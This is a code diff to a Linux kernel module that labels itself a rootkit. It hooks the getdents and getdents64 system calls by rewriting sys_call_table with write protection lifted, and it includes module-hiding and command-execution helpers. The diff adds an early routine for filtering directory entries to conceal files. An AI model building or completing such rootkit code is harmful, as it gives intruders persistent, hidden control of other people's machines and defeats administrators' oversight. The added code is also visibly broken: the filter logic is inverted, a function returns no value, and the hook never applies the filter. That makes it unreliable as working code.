@@ -34,8 +34,38 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
 }
 
 asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+	int length;
 	pr_info("ROOTKIT hooked call to new_getdents64");
-	return real_getdents64(fd, dirp, count);
+	length = real_getdents64(fd, dirp, count);
+	
+	if (length == -1 || length == 0) return length;
+	
+	return length;
+}
+
+void filter_out(struct linux_dirent *dirp, int length, int (*pred)(struct linux_dirent)) {
+	int index = 0;
+	int index_copyto = -1;
+	unsigned short reclen;
+	// Why ints? Because getdents[64] returns an int.
+	
+	while (index < length) {
+		reclen = dirp[index].d_reclen;
+		if (!pred(*(dirp+index))) {
+			if (index_copyto != -1) {
+				index_copyto = index;
+			}
+		} else if (index_copyto != -1) {
+			memmove(dirp+index_copyto, dirp+index, reclen);
+			index_copyto += reclen;
+		}
+		
+		index += reclen;
+	}
+}
+
+int filter_fn(struct linux_dirent d) {
+	pr_info(d.d_name);
 }
 
 void module_hide(void) {
@@ -60,7 +90,7 @@ static int exec_cmd(char *script){
 	envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
 	envp[2] = NULL;
 
-        /* use UHM_WAIT_PROC to get useful error information *
+        // use UHM_WAIT_PROC to get useful error information
 	pr_info("ROOTKIT executing %s\n", argv[1]);
 	if (call_usermodehelper(cmd, argv, envp, UMH_NO_WAIT)) {
 		//pr_info("ROOTKIT call_usermodehelper() failed\n");
@@ -108,8 +138,8 @@ static int __init my_init(void)
 		real_getdents = (void *)syscall_table[__NR_getdents];
 		real_getdents64 = (void *)syscall_table[__NR_getdents64];
 		
-		syscall_table[__NR_getdents] = &new_getdents;
-		syscall_table[__NR_getdents64] = &new_getdents64;
+		syscall_table[__NR_getdents] = (unsigned long)&new_getdents;
+		syscall_table[__NR_getdents64] = (unsigned long)&new_getdents64;
 		
 		pte->pte &= ~_PAGE_RW;
 		printk(KERN_EMERG "ROOTKIT sys_call_table hooked\n");
@@ -135,8 +165,8 @@ static void __exit my_exit(void)
 
         pte->pte |= _PAGE_RW;
 
-        syscall_table[__NR_getdents] = real_getdents;
-        syscall_table[__NR_getdents64] = real_getdents64;
+        syscall_table[__NR_getdents] = (unsigned long)real_getdents;
+        syscall_table[__NR_getdents64] = (unsigned long)real_getdents64;
 
         pte->pte &= ~_PAGE_RW;
 
